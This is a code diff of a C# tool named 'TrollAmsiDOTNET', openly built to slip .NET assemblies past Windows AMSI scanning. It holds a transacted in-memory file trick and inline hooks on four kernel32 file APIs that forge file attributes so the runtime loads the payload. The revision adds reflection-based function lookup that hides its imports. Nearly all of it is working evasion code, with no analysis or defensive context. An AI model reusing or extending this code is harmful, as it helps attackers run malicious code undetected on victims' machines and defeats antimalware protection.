@@ -1,49 +1,49 @@
 using System;
+using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 
 
-public static class TrollAMSIdotnet 
+public static class TrollAmsiDOTNET
 {
 
-    [DllImport("Kernel32.dll")][return: MarshalAs(UnmanagedType.Bool)]
-    public static extern bool WriteFile(IntPtr hFile,byte[] lpBuffer,uint nNumberOfBytesToWrite,out uint lpNumberOfBytesWritten,IntPtr lpOverlapped);
+    [DllImport("Kernel32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
 
-    [System.Runtime.InteropServices.DllImport("ktmw32.dll", SetLastError = true, CallingConvention = System.Runtime.InteropServices.CallingConvention.StdCall)]
-    public extern static System.IntPtr CreateTransaction(IntPtr lpTransactionAttributes,IntPtr UOW,int CreateOptions,int IsolationLevel,int IsolationFlags,int Timeout,[System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] System.Text.StringBuilder Description);
+    [DllImport("ktmw32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+    public extern static IntPtr CreateTransaction(IntPtr lpTransactionAttributes, IntPtr UOW, int CreateOptions, int IsolationLevel, int IsolationFlags, int Timeout, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder Description);
 
     [DllImport("Kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateFileTransactedW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName,UInt32 dwDesiredAccess,UInt32 dwShareMode,IntPtr lpSecurityAttributes,UInt32 dwCreationDisposition,UInt32 dwFlagsAndAttributes,IntPtr hTemplateFile,IntPtr hTransaction,ref ushort pusMiniVersion,IntPtr nullValue);
+    public static extern IntPtr CreateFileTransactedW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile, IntPtr hTransaction, ref ushort pusMiniVersion, IntPtr nullValue);
 
     [DllImport("Kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool CloseHandle(IntPtr hObject);
 
-    [DllImport("KernelBase.dll")]
-    public static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName,UInt32 dwDesiredAccess,UInt32 dwShareMode,IntPtr lpSecurityAttributes,UInt32 dwCreationDisposition,UInt32 dwFlagsAndAttributes,IntPtr hTemplateFile);
-
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr delegateCreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName,UInt32 dwDesiredAccess,UInt32 dwShareMode,IntPtr lpSecurityAttributes,UInt32 dwCreationDisposition,UInt32 dwFlagsAndAttributes,IntPtr hTemplateFile);
+    public delegate IntPtr delegateCreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate uint delegateGetFileAttributesW(IntPtr lpFileName);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate bool delegateGetFileAttributesExW(IntPtr lpFileName, uint fInfoLevelId, IntPtr lpFileInformation);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate bool deledateGetFileInformationByHandle(IntPtr hFile, IntPtr lpFileInformation);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)] public delegate bool delegateVirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);
 
-    [DllImport("KernelBase.dll")]
-    public static extern uint GetFileAttributesW(IntPtr lpFileName);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint delegateGetFileAttributesW(IntPtr lpFileName);
-
-
-    [DllImport("KernelBase.dll")]
-    public static extern bool GetFileAttributesExW(IntPtr lpFileName,uint fInfoLevelId,IntPtr lpFileInformation);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool delegateGetFileAttributesExW(IntPtr lpFileName,uint fInfoLevelId,IntPtr lpFileInformation);
-
-    [DllImport("KernelBase.dll", SetLastError = true)]
-    public static extern bool GetFileInformationByHandle(IntPtr hFile, IntPtr lpFileInformation);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool deledateGetFileInformationByHandle(IntPtr hFile,IntPtr lpFileInformation);
+    public static IntPtr GetProcAddress(string moduleName, string procedureName)
+    {
+        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
+        Assembly systemAssembly = assemblies.FirstOrDefault(a =>
+            a.GlobalAssemblyCache &&
+            a.Location.EndsWith("System.dll", StringComparison.OrdinalIgnoreCase));
+        Type unsafeNativeMethods = systemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods");
+        MethodInfo getModuleHandle = unsafeNativeMethods.GetMethod("GetModuleHandle", new Type[] { typeof(string) });
+        MethodInfo getProcAddress = unsafeNativeMethods.GetMethod("GetProcAddress", new Type[] { typeof(HandleRef), typeof(string) });
+        object hModule = getModuleHandle.Invoke(null, new object[] { moduleName });
+        IntPtr dummyPtr = IntPtr.Zero;
+        HandleRef handleRef = new HandleRef(dummyPtr, (IntPtr)hModule);
+        object procAddress = getProcAddress.Invoke(null, new object[] { handleRef, procedureName });
+        return (IntPtr)procAddress;
+    }
 
 
     public static IntPtr createFileHandle;
@@ -52,23 +52,24 @@ public static class TrollAMSIdotnet
     public static byte[] attributeData = new byte[36];
     static bool attribDataSet = false;
     static int assemblyLength;
-    static NetHook hook1= new NetHook(), hook2= new NetHook(), hook3 = new NetHook(), hook4 = new NetHook();
 
-    
-    public static Assembly Load(byte[] assemblyBytes, string assemblyName)
+    struct HookEntry
     {
-        Assembly a = Load2(assemblyBytes, assemblyName);
-        return a;
+        public Delegate detour;
+        public string api;
+        public IntPtr hookAddr, targetAddr;
+        public byte[] originalBytes, hookBytes;
+        public int oldProtect;
     }
 
-    public static void Invoke(Assembly a, string[] args)
-    {
-        a.EntryPoint.Invoke(null, new object[] { args });
-    }
+    static HookEntry[] hooks = new HookEntry[4];
+    static delegateCreateFileW A;
+    static delegateGetFileAttributesW B;
+    static delegateGetFileAttributesExW C;
+    static deledateGetFileInformationByHandle D;
 
 
-
-    public static Assembly Load2(byte[] assemblyBytes, string assemblyName)
+    public static Assembly SpoofFileLoad(byte[] assemblyBytes, string assemblyName)
     {
 
         loadedAssemblyName = assemblyName;
@@ -84,27 +85,39 @@ public static class TrollAMSIdotnet
         ushort miniVersion = 0xffff;
         IntPtr transactionHandle = IntPtr.Zero;
         //Create a transaction, pass the transaction handle to CreateFileTransacted
-     
+
         transactionHandle = CreateTransaction(lpTransactionAttributes, UOW, CreateOptions, IsolationLevel, IsolationFlags, Timeout, Description);
         string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         path = path + string.Format(@"\{0}.log", getRandomName(rand));
         createFileHandle = CreateFileTransactedW(path, 0x80000000 | 0x40000000, 0x00000002, IntPtr.Zero, 0x00000001, 0x100 | 0x04000000, IntPtr.Zero, transactionHandle, ref miniVersion, IntPtr.Zero);
-        if (createFileHandle.ToInt32() == -1){throw new ArgumentException("Error - Invalid handle returned by CreateFileTransacted call");}
+        if (createFileHandle.ToInt32() == -1) { throw new ArgumentException("Error - Invalid handle returned by CreateFileTransacted call"); }
         uint bytesWritten = 0;
         assemblyLength = assemblyBytes.Length;
         bool written = WriteFile(createFileHandle, assemblyBytes, (uint)assemblyBytes.Length, out bytesWritten, IntPtr.Zero);
 
 
-        delegateCreateFileW A = CreateFileWDetour;
-        delegateGetFileAttributesW B = GetFileAttributesWDetour;
-        delegateGetFileAttributesExW C = GetFileAttributesExWDetour;
-        deledateGetFileInformationByHandle D = GetFileInformationByHandleDetour;
+        A = CreateFileWDetour; B = GetFileAttributesWDetour; C = GetFileAttributesExWDetour; D = GetFileInformationByHandleDetour;
 
-        hook1.Install(hook1.GetProcAddress("KernelBase.dll", "CreateFileW"), Marshal.GetFunctionPointerForDelegate(A));
-        hook2.Install(hook2.GetProcAddress("KernelBase.dll", "GetFileAttributesW"), Marshal.GetFunctionPointerForDelegate(B));
-        hook3.Install(hook3.GetProcAddress("KernelBase.dll", "GetFileAttributesExW"), Marshal.GetFunctionPointerForDelegate(C));
-        hook4.Install(hook4.GetProcAddress("KernelBase.dll", "GetFileInformationByHandle"), Marshal.GetFunctionPointerForDelegate(D));
-     
+        IntPtr VPAddr = GetProcAddress("kernel32.dll", "VirtualProtect");
+        A = CreateFileWDetour; B = GetFileAttributesWDetour; C = GetFileAttributesExWDetour; D = GetFileInformationByHandleDetour;
+        hooks[0].detour = A; hooks[0].api = "CreateFileW";
+        hooks[1].detour = B; hooks[1].api = "GetFileAttributesW";
+        hooks[2].detour = C; hooks[2].api = "GetFileAttributesExW";
+        hooks[3].detour = D; hooks[3].api = "GetFileInformationByHandle";
+
+        var vp = (delegateVirtualProtect)Marshal.GetDelegateForFunctionPointer(GetProcAddress("kernel32.dll", "VirtualProtect"), typeof(delegateVirtualProtect));
+
+        for (int i = 0; i < hooks.Length; i++)
+        {
+            hooks[i].hookAddr = Marshal.GetFunctionPointerForDelegate(hooks[i].detour);
+            hooks[i].targetAddr = GetProcAddress("kernel32.dll", hooks[i].api);
+            hooks[i].originalBytes = new byte[12];
+            Marshal.Copy(hooks[i].targetAddr, hooks[i].originalBytes, 0, 12);
+            hooks[i].hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hooks[i].hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();
+            vp(hooks[i].targetAddr, 12, 0x40, out hooks[i].oldProtect);
+            Marshal.Copy(hooks[i].hookBytes, 0, hooks[i].targetAddr, hooks[i].hookBytes.Length);
+        }
+
         Assembly a = Assembly.Load(loadedAssemblyName.Substring(0, loadedAssemblyName.Length - 4));
 
         attribDataSet = false;
@@ -115,242 +128,103 @@ public static class TrollAMSIdotnet
 
     }
 
-
-    static private string getRandomName(Random rand)
+    static string getRandomName(Random rand)
     {
-        string seedVals = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-        char[] stringChars = new char[8];
-        for (int i = 0; i < stringChars.Length; i++)
-        {
-            stringChars[i] = seedVals[rand.Next(seedVals.Length)];
-        }
-        return new string(stringChars);
+        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+        return new string(Enumerable.Range(0, 8).Select(_ => chars[rand.Next(chars.Length)]).ToArray());
     }
 
-    static private IntPtr CreateFileWDetour([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile)
+    static IntPtr CreateFileWDetour(string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile)
     {
+        var F = (delegateCreateFileW)Marshal.GetDelegateForFunctionPointer(hooks[0].targetAddr, typeof(delegateCreateFileW));
         try
         {
-            hook1.Suspend();
-
-            if (lpFileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
-            {
-
-                //if a request is made for the nonexistent assembly we're attempting to load, we return a handle to our memory-only transacted file
-                return createFileHandle;
-            }
-            IntPtr fileHandle = CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
-            return fileHandle;
+            Marshal.Copy(hooks[0].originalBytes, 0, hooks[0].targetAddr, 12);
+            if (lpFileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase)) return createFileHandle;
+            return F(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
         }
         finally
         {
-            hook1.Resume();
+            Marshal.Copy(hooks[0].hookBytes, 0, hooks[0].targetAddr, 12);
         }
     }
 
-    static private uint GetFileAttributesWDetour(IntPtr lpFileName)
+    static uint GetFileAttributesWDetour(IntPtr lpFileName)
     {
+        var F = (delegateGetFileAttributesW)Marshal.GetDelegateForFunctionPointer(hooks[1].targetAddr, typeof(delegateGetFileAttributesW));
         try
         {
-            hook2.Suspend();
-
+            Marshal.Copy(hooks[1].originalBytes, 0, hooks[1].targetAddr, 12);
             string fileName = Marshal.PtrToStringUni(lpFileName);
-            if (fileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
-            {
-                //32 == FILE_ATTRIBUTE_ARCHIVE  -- default value returned when Assembly.Load() is ran with an on-disk assembly
-                return 32;
-            }
-            else
-            {
-                return GetFileAttributesW(lpFileName);
-            }
-
+            return fileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase) ? 32 : F(lpFileName);
         }
         finally
         {
-            hook2.Resume();
+            Marshal.Copy(hooks[1].hookBytes, 0, hooks[1].targetAddr, 12);
         }
     }
 
-    static private bool GetFileAttributesExWDetour(IntPtr lpFileName, uint fInfoLevelId, IntPtr lpFileInformation)
+    static bool GetFileAttributesExWDetour(IntPtr lpFileName, uint fInfoLevelId, IntPtr lpFileInformation)
     {
+        var F = (delegateGetFileAttributesExW)Marshal.GetDelegateForFunctionPointer(hooks[2].targetAddr, typeof(delegateGetFileAttributesExW));
         try
         {
-            hook3.Suspend();
-
+            Marshal.Copy(hooks[2].originalBytes, 0, hooks[2].targetAddr, 12);
             string fileName = Marshal.PtrToStringUni(lpFileName);
             if (fileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
             {
-                //builds a byte array that represents a WIN32_FILE_ATTRIBUTE_DATA structure.  Will only build it once as this call is made twice in an Assembly.Load() call
                 if (!attribDataSet)
                 {
-                    Random a = new Random();
-                    DateTime creationTime = DateTime.Now.AddSeconds(a.Next(604800) * -1);
-                    BitConverter.GetBytes(0x00000020).CopyTo(attributeData, 0);
+                    var rand = new Random();
+                    var creationTime = DateTime.Now.AddSeconds(rand.Next(-604800, 0));
+                    BitConverter.GetBytes(0x20).CopyTo(attributeData, 0);
                     BitConverter.GetBytes(creationTime.ToFileTime()).CopyTo(attributeData, 4);
-                    TimeSpan t = DateTime.Now - creationTime;
-                    DateTime writeTime = creationTime.AddSeconds(a.Next((int)t.TotalSeconds));
+                    var writeTime = creationTime.AddSeconds(rand.Next((int)(DateTime.Now - creationTime).TotalSeconds));
                     BitConverter.GetBytes(writeTime.ToFileTime()).CopyTo(attributeData, 20);
-                    t = DateTime.Now - writeTime;
-                    DateTime modifiedTime = writeTime.AddSeconds(a.Next((int)t.TotalSeconds));
-                    BitConverter.GetBytes(modifiedTime.ToFileTime()).CopyTo(attributeData, 12);
-                    BitConverter.GetBytes(0x00000000).CopyTo(attributeData, 28);
+                    var modTime = writeTime.AddSeconds(rand.Next((int)(DateTime.Now - writeTime).TotalSeconds));
+                    BitConverter.GetBytes(modTime.ToFileTime()).CopyTo(attributeData, 12);
+                    BitConverter.GetBytes(0).CopyTo(attributeData, 28);
                     BitConverter.GetBytes(assemblyLength).CopyTo(attributeData, 32);
                     Marshal.Copy(attributeData, 0, lpFileInformation, 36);
                     attribDataSet = true;
-                    return true;
                 }
-                else
-                {
-                    Marshal.Copy(attributeData, 0, lpFileInformation, 36);
-                    return true;
-                }
-            }
-            return GetFileAttributesExW(lpFileName, fInfoLevelId, lpFileInformation);
-
-        }
-        finally
-        {
-            hook3.Resume();
-        }
-    }
-
-    static private bool GetFileInformationByHandleDetour(IntPtr hFile, IntPtr lpFileInformation)
-    {
-        try
-        {
-            hook4.Suspend();
-
-            if (hFile == createFileHandle)
-            {
-
-                //builds a byte array that represents a BY_HANDLE_FILE_INFORMATION struct and writes it to the lpFileInformation pointer
-                //contains the same information first provided in the GetFileAttributesExW call as the CLR compares these to ensure it has a handle to the correct file
-                byte[] handleFileInfoData = new byte[52];
-                Buffer.BlockCopy(attributeData, 0, handleFileInfoData, 0, 28);
-                Random byteGenerator = new Random();
-                byte[] serialNumber = new byte[4];
-                byte[] fileFingerprint = new byte[8];
-                byteGenerator.NextBytes(serialNumber);
-                byteGenerator.NextBytes(fileFingerprint);
-                //probably unecessary to swap these back to 0
-                fileFingerprint[0] = 0x00;
-                fileFingerprint[1] = 0x00;
-                Array.Copy(serialNumber, 0, handleFileInfoData, 28, 4);
-                Buffer.BlockCopy(attributeData, 28, handleFileInfoData, 32, 8);
-                BitConverter.GetBytes(0x01).CopyTo(handleFileInfoData, 40);
-                Array.Copy(fileFingerprint, 0, handleFileInfoData, 44, 8);
-                Marshal.Copy(handleFileInfoData, 0, lpFileInformation, 52);
+                else Marshal.Copy(attributeData, 0, lpFileInformation, 36);
                 return true;
             }
-            return GetFileInformationByHandle(hFile, lpFileInformation);
-
+            return F(lpFileName, fInfoLevelId, lpFileInformation);
         }
         finally
         {
-            hook4.Resume();
+            Marshal.Copy(hooks[2].hookBytes, 0, hooks[2].targetAddr, 12);
         }
     }
 
-
-}
-
-
-public class NetHook
-{
-    private int mOldMemoryProtect;
-    private IntPtr mOldMethodAddress;
-    private IntPtr mNewMethodAddress;
-    private byte[] mOldMethodAsmCode;
-    private byte[] mNewMethodAsmCode;
-
-    public const int PAGE_EXECUTE_READWRITE = 64;
-    public static readonly IntPtr NULL = IntPtr.Zero;
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect, out int lpflOldProtect);
-
-    public void Install(IntPtr oldMethodAddress, IntPtr newMethodAddress)
+    static bool GetFileInformationByHandleDetour(IntPtr hFile, IntPtr lpFileInformation)
     {
-        if (oldMethodAddress == NULL || newMethodAddress == NULL)
-            throw new Exception("The address is invalid.");
-        if (!VirtualProtect(oldMethodAddress,12, PAGE_EXECUTE_READWRITE, out this.mOldMemoryProtect))
-            throw new Exception("Unable to modify memory protection.");
-        this.mOldMethodAddress = oldMethodAddress;
-        this.mNewMethodAddress = newMethodAddress;
-        this.mOldMethodAsmCode = this.GetHeadCode(this.mOldMethodAddress);
-        this.mNewMethodAsmCode = this.ConvetToBinary((long)this.mNewMethodAddress);
-        this.mNewMethodAsmCode = this.CombineOfArray(new byte[] { 0x48, 0xB8 }, this.mNewMethodAsmCode);
-        this.mNewMethodAsmCode = this.CombineOfArray(this.mNewMethodAsmCode, new byte[] { 0xFF, 0xE0 });
-        if (!this.WriteToMemory(this.mNewMethodAsmCode, this.mOldMethodAddress, 12))
-            throw new Exception("Cannot be written to memory.");
-    }
-
-    public void Suspend()
-    {
-        if (this.mOldMethodAddress == NULL)
-            throw new Exception("Unable to suspend.");
-        this.WriteToMemory(this.mOldMethodAsmCode, this.mOldMethodAddress, 12);
-    }
-
-    public void Resume()
-    {
-        if (this.mOldMethodAddress == NULL)
-            throw new Exception("Unable to resume.");
-        this.WriteToMemory(this.mNewMethodAsmCode, this.mOldMethodAddress, 12);
-    }
-
-    private byte[] GetHeadCode(IntPtr ptr)
-    {
-        byte[] buffer = new byte[12];
-        Marshal.Copy(ptr, buffer, 0, 12);
-        return buffer;
-    }
-    private byte[] ConvetToBinary(long num)
-    {
-        byte[] buffer = new byte[8];
-        IntPtr ptr = Marshal.AllocHGlobal(8);
-        Marshal.WriteInt64(ptr, num);
-        Marshal.Copy(ptr, buffer, 0, 8);
-        Marshal.FreeHGlobal(ptr);
-        return buffer;
-    }
-    private byte[] CombineOfArray(byte[] x, byte[] y)
-    {
-        int i = 0, len = x.Length;
-        byte[] buffer = new byte[len + y.Length];
-        while (i < len)
+        var F = (deledateGetFileInformationByHandle)Marshal.GetDelegateForFunctionPointer(hooks[3].targetAddr, typeof(deledateGetFileInformationByHandle));
+        try
         {
-            buffer[i] = x[i];
-            i++;
+            Marshal.Copy(hooks[3].originalBytes, 0, hooks[3].targetAddr, 12);
+            if (hFile == createFileHandle)
+            {
+                byte[] data = new byte[52];
+                Buffer.BlockCopy(attributeData, 0, data, 0, 28);
+                var rand = new Random();
+                byte[] serial = new byte[4], fingerprint = new byte[8];
+                rand.NextBytes(serial); rand.NextBytes(fingerprint);
+                fingerprint[0] = fingerprint[1] = 0;
+                Array.Copy(serial, 0, data, 28, 4);
+                Buffer.BlockCopy(attributeData, 28, data, 32, 8);
+                BitConverter.GetBytes(1).CopyTo(data, 40);
+                Array.Copy(fingerprint, 0, data, 44, 8);
+                Marshal.Copy(data, 0, lpFileInformation, 52);
+                return true;
+            }
+            return F(hFile, lpFileInformation);
         }
-        while (i < buffer.Length)
+        finally
         {
-            buffer[i] = y[i - len];
-            i++;
+            Marshal.Copy(hooks[3].hookBytes, 0, hooks[3].targetAddr, 12);
         }
-        return buffer;
     }
-    private bool WriteToMemory(byte[] buffer, IntPtr address, uint size)
-    {
-        try { Marshal.Copy(buffer, 0, address, 12); return true; } catch (Exception e) { return false; }   
-
-    }
-
-    public IntPtr GetProcAddress(string strLibraryName, string strMethodName)
-    {
-        return GetProcAddress(GetModuleHandle(strLibraryName), strMethodName);
-    }
-
 }
-
-
-
-
-
